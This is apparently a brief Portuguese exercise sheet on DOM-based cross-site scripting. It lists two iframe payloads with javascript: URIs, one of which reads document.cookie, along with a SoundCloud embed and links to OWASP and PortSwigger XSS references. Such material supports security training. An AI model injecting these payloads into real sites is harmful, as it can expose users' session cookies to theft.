## Realize um ataque XSS do tipo DOM

```
<iframe src="javascript:alert(`xss`)">
```
```
<iframe src="javascript:alert(document.cookie)">
```
```
<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe> 
```
https://owasp.org/www-community/Types_of_Cross-Site_Scripting

https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
